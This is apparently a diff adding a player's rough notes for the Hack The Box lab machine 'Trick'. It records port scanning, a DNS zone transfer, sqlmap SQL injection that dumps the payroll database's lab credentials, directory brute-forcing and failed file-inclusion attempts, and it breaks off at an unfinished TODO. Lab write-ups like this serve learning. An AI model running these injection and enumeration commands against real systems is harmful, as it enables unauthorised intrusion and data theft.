@@ -1,0 +1,92 @@
+# Scanning
+22/tcp open  ssh     OpenSSH 7.9p1SH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 61ff293b36bd9dacfbde1f56884cae2d (RSA)
+|   256 9ecdf2406196ea21a6ce2602af759a78 (ECDSA)
+|_  256 7293f91158de34ad12b54b4a7364b970 (ED25519)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+| dns-nsid:
+|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Coming Soon - Start Bootstrap Theme
+Service Info: Host:  debian.localdoma in; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# Enum
+## 22
+OpenSSH 7.9p1 => may be https://www.rapid7.com/db/modules/exploit/multi/ssh/sshexec/
+
+## 25
+telnet 10.10.11.166 25 => 220 debian.localdomain ESMTP Postfix (Debian/GNU)
+
+## 53
+BIND 9.11.5-P4-5.1+deb10u7 => nope
+dig axfr @10.10.11.166 trick.htb =>
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.              604800  IN      NS      trick.htb.
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+
+The preprod-payroll.trick.htb and root.trick.htb are interesting.
+
+## 80
+### trick.htb
+RTFSC => no
+nginx 1.14.2 => no
+gobuster => nothing.
+
+### preprod-payroll.trick.htb
+"Admin payroll management system" and a login page.
+sqlmap -r post.txt => the "username" is vulnerable.
+sqlmap -r post.txt --current-user => remo@localhost
+
+sqlmap -r post.txt --dbs =>
+available databases [2]:
+[*] information_schema
+[*] payroll_db
+
+sqlmap -r /tmp/post.txt --passwords => failed.
+sqlmap -r /tmp/post.txt -D payroll_db --dump =>
+users.csv =>
+id,doctor_id,name,type,address,contact,password,username
+1,0,Administrator,1,<blank>,<blank>,SuperGucciRainbowCake,Enemigosss
+employee.csv =>
+id,position_id,department_id,salary,lastname,firstname,middlename,employee_no
+9,1,1,30000,Smith,John,C,2020-9838
+
+sqlmap -r /tmp/post.txt -D payroll_db --dump
+=> some users and passwords
+
+cme => failed
+
+used the found user "enemigosss" and password "SuperGucciRainbowCake" => logged into preprod-payroll.trick.htb
+the url is like `http://preprod-payroll.trick.htb/index.php?page=attendance`. Tried LFI "/etc/passwd" and RFI => no luck
+looks like it adds suffixes 'php' because `http://preprod-payroll.trick.htb/position.php` is okay.
+
+gobuster dir -u http://preprod-payroll.trick.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -x php,txt,html -c 'PHPSESSID:"d0bcsr6hedtavvbgihspqh7756"'
+=>
+/login.php            (Status: 200) [Size: 5571]
+/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
+/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
+/ajax.php             (Status: 200) [Size: 0]
+/home.php             (Status: 200) [Size: 486]
+/users.php            (Status: 200) [Size: 2197]
+/index.php            (Status: 302) [Size: 9546] [--> login.php]
+/header.php           (Status: 200) [Size: 2548]
+/employee.php         (Status: 200) [Size: 2717]
+/navbar.php           (Status: 200) [Size: 1382]
+/readme.txt           (Status: 200) [Size: 149]
+/db_connect.php       (Status: 200) [Size: 0]
+/department.php       (Status: 200) [Size: 4844]
+/payroll.php          (Status: 200) [Size: 3142]
+/position.php         (Status: 200) [Size: 5549]
+
+
+### root.trick.htb
+looks the same page as the trick.htb
+
+(TODO: failed after this. Hint: the first LFI we found can read .php files and we should have use that to get something. sqlmap can check privilege and see if you can read nginx default config. There is another website and there is another LFI.
